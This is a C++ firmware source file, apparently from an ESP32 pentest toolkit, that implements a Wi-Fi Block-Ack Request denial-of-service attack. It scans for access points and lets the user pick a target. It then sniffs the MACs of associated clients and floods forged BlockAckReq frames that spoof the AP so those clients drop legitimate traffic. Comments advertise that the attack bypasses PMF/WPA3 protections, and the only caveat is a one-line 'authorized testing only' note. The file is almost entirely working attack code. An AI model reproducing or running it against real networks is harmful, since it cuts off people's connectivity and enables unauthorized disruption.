#include "blockack_dos.h"

#include "core/display.h"
#include "core/mykeyboard.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>
#include <array>
#include <vector>

// ─────────────────────────────────────────────────────────────────────────────
// Block-Ack (BAR) DoS. Sets the radio to STA + promiscuous on the target AP's
// channel (same monitor-mode path the deauther's "enhanced mode" uses), harvests
// the MACs of stations associated to the target from passing data frames, then
// floods forged compressed BlockAckReq control frames: TA = spoofed AP BSSID,
// RA = each victim STA, with a Starting Sequence Number swept ahead of live
// traffic so the receiver's reorder window jumps forward and legitimate frames
// are dropped. BAR is a control frame, so 802.11w/PMF (mandatory on WPA3) does
// not protect against it — this is the whole point versus the deauther.
//
// Raw injection relies on the process-global ieee80211_raw_frame_sanity_check
// override already compiled into wifi_atks.cpp. Transmit module: authorized
// testing only.
// ─────────────────────────────────────────────────────────────────────────────

// esp_wifi_80211_tx lives in esp_wifi_internal.h; declare it like pwngrid.cpp does.
extern "C" esp_err_t
esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

namespace {

// ── Target + harvested clients (shared with the promiscuous callback) ─────────
uint8_t targetBssid[6];
uint8_t targetChannel = 1;

constexpr size_t MAX_CLIENTS = 32;
uint8_t clients[MAX_CLIENTS][6];
volatile size_t clientCount = 0;
volatile uint32_t harvestedFrames = 0;

bool macEq(const uint8_t *a, const uint8_t *b) { return memcmp(a, b, 6) == 0; }
bool isUnicast(const uint8_t *m) { return (m[0] & 0x01) == 0; }

void addClient(const uint8_t *mac) {
    if (!isUnicast(mac)) return;
    if (macEq(mac, targetBssid)) return;
    for (size_t i = 0; i < clientCount; i++)
        if (macEq(clients[i], mac)) return;
    if (clientCount >= MAX_CLIENTS) return;
    memcpy(clients[clientCount], mac, 6);
    clientCount = clientCount + 1;
}

// Harvest STAs of the target BSSID from data frames (addressing depends on
// To/From DS). We only read; injection happens in the main loop.
void harvest_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    auto *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 24) return;

    uint8_t fc1 = p[1];
    bool toDS = fc1 & 0x01;
    bool fromDS = fc1 & 0x02;
    const uint8_t *a1 = p + 4, *a2 = p + 10;

    const uint8_t *bssid = nullptr, *client = nullptr;
    if (!toDS && fromDS) { // AP -> STA : a1 = client, a2 = BSSID
        client = a1;
        bssid = a2;
    } else if (toDS && !fromDS) { // STA -> AP : a1 = BSSID, a2 = client
        bssid = a1;
        client = a2;
    } else return; // ad-hoc / WDS: skip

    if (!macEq(bssid, targetBssid)) return;
    harvestedFrames = harvestedFrames + 1;
    addClient(client);
}

// Build a 20-byte compressed BlockAckReq (no FCS; hardware appends it).
//   FC=0x84 (control / BlockAckReq), Dur, RA(victim), TA(spoofed AP),
//   BAR Control=0x0004 (compressed, TID 0), BA-SSC = ssn<<4.
void buildBar(uint8_t *bar, const uint8_t *ra, const uint8_t *ta, uint16_t ssn) {
    bar[0] = 0x84;
    bar[1] = 0x00;
    bar[2] = 0x00; // Duration
    bar[3] = 0x00;
    memcpy(bar + 4, ra, 6);  // RA = receiver (victim STA)
    memcpy(bar + 10, ta, 6); // TA = transmitter (spoofed AP BSSID)
    bar[16] = 0x04;          // BAR Control: Compressed Bitmap set, TID 0
    bar[17] = 0x00;
    uint16_t ssc = (uint16_t)((ssn & 0x0FFF) << 4); // fragment 0, SSN
    bar[18] = ssc & 0xFF;
    bar[19] = (ssc >> 8) & 0xFF;
}

// Mirror deauther "enhanced mode": stop, re-init, STA + promiscuous, lock channel.
bool startMonitor(uint8_t channel) {
    esp_wifi_stop();
    delay(5);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(harvest_cb);
    esp_wifi_set_promiscuous(true);
    if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        esp_wifi_set_promiscuous(false);
        return false;
    }
    esp_wifi_set_max_tx_power(78);
    return true;
}

String macStr(const uint8_t *m) {
    char b[18];
    snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
    return String(b);
}

// Scan and let the user pick the target AP. Returns false if cancelled.
bool selectTarget(String &ssidOut) {
    displayTextLine("Scanning..");
    int nets = WiFi.scanNetworks(false, true);
    if (nets <= 0) {
        displayError("No networks found", true);
        return false;
    }
    std::vector<Option> options;
    std::vector<std::array<uint8_t, 6>> bssids;
    std::vector<uint8_t> chans;
    std::vector<String> ssids;
    bool picked = false;
    int chosen = -1;
    for (int i = 0; i < nets; i++) {
        std::array<uint8_t, 6> b{};
        memcpy(b.data(), WiFi.BSSID(i), 6);
        bssids.push_back(b);
        chans.push_back((uint8_t)WiFi.channel(i));
        String s = WiFi.SSID(i);
        if (s.length() == 0) s = "<hidden> " + WiFi.BSSIDstr(i);
        ssids.push_back(s);
        String label = s + " (" + String(WiFi.RSSI(i)) + "|ch." + String(WiFi.channel(i)) + ")";
        options.push_back({label.c_str(), [i, &chosen, &picked]() {
                               chosen = i;
                               picked = true;
                           }});
    }
    options.push_back({"[Cancel]", []() {}});
    loopOptions(options, MENU_TYPE_SUBMENU, "BAR DoS: target");
    WiFi.scanDelete();
    if (!picked || chosen < 0) return false;
    memcpy(targetBssid, bssids[chosen].data(), 6);
    targetChannel = chans[chosen];
    ssidOut = ssids[chosen];
    return true;
}

} // namespace

void blockack_dos() {
    String ssid;
    clientCount = 0;
    harvestedFrames = 0;

    if (!selectTarget(ssid)) return;

    Serial.printf(
        "[BlockAck] BAR DoS target ssid=\"%s\" bssid=%s ch=%u (PMF-bypassing)\n", ssid.c_str(),
        macStr(targetBssid).c_str(), targetChannel
    );

    wifi_mode_t prevMode = WiFi.getMode();
    if (!startMonitor(targetChannel)) {
        displayError("Monitor mode failed", true);
        WiFi.mode(prevMode == WIFI_MODE_NULL ? WIFI_MODE_STA : prevMode);
        return;
    }

    drawMainBorderWithTitle("Block-Ack DoS");
    tft.setTextSize(FP);
    padprintln("Tgt: " + ssid);
    padprintln("BSSID: " + macStr(targetBssid));
    padprintln("CH: " + String(targetChannel) + "  (bypasses PMF/WPA3)");
    padprintln("");
    padprintln("Harvesting clients + flooding BAR");
    padprintln("Press ESC to STOP.");

    uint8_t bar[20];
    const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint16_t ssn = 0;
    uint32_t framesSent = 0;
    uint32_t lastStat = millis();
    uint32_t lastSerial = millis();
    uint16_t rate = 0;

    while (!check(EscPress)) {
        size_t n = clientCount;
        // Sweep the SSN forward each burst so the reorder window keeps jumping.
        ssn = (uint16_t)((ssn + 97) & 0x0FFF);

        if (n == 0) {
            // No client harvested yet: broadcast RA as a best-effort fallback.
            buildBar(bar, bcast, targetBssid, ssn);
            esp_wifi_80211_tx(WIFI_IF_STA, bar, sizeof(bar), false);
            framesSent++;
        } else {
            for (size_t i = 0; i < n; i++) {
                buildBar(bar, clients[i], targetBssid, ssn);
                esp_wifi_80211_tx(WIFI_IF_STA, bar, sizeof(bar), false);
                framesSent++;
            }
        }
        rate += (n == 0 ? 1 : n);

        if (millis() - lastStat > 1000) {
            tft.fillRect(0, tftHeight - 22, tftWidth, 22, bruceConfig.bgColor);
            tft.setCursor(6, tftHeight - 20);
            tft.print(
                "clients:" + String((unsigned)clientCount) + "  " + String(rate) + " bar/s  tot:" +
                String(framesSent)
            );
            rate = 0;
            lastStat = millis();
        }
        if (millis() - lastSerial > 2000) {
            Serial.printf(
                "[BlockAck] clients=%u sent=%lu harvestFrames=%lu lastSSN=%u\n",
                (unsigned)clientCount, (unsigned long)framesSent, (unsigned long)harvestedFrames, ssn
            );
            lastSerial = millis();
        }
        delay(2);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.mode(prevMode == WIFI_MODE_NULL ? WIFI_MODE_STA : prevMode);

    Serial.printf(
        "[BlockAck] stopped. clients=%u totalBAR=%lu\n", (unsigned)clientCount,
        (unsigned long)framesSent
    );
    tft.fillRect(0, tftHeight - 40, tftWidth, 40, bruceConfig.bgColor);
    padprintln("Stopped. BAR sent: " + String(framesSent));
    delay(800);
}
